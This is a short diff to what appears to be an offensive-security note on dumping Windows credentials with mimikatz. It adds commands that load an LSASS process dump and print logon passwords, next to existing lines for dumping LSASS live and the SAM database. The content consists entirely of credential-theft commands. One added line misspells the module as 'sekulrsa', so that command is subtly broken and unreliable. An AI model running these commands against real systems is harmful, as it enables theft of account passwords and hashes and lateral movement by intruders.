@@ -24,6 +24,10 @@ This note does not cover the basics of Windows authentication.  For an overview 
 # Dump LSASS (non-interactive)
 ./mimikatz.exe "sekurlsa::logonpasswords exit"
 
+# Dump LSASS from a process dump
+./mimikatz.exe "sekurlsa::minidump <lsass>.dmp"
+./mimikatz.exe "sekulrsa::logonpasswords"
+
 # Dump the SAM database (requires: SYSTEM)
 ./mimikatz.exe "lsadump::sam exit"
 
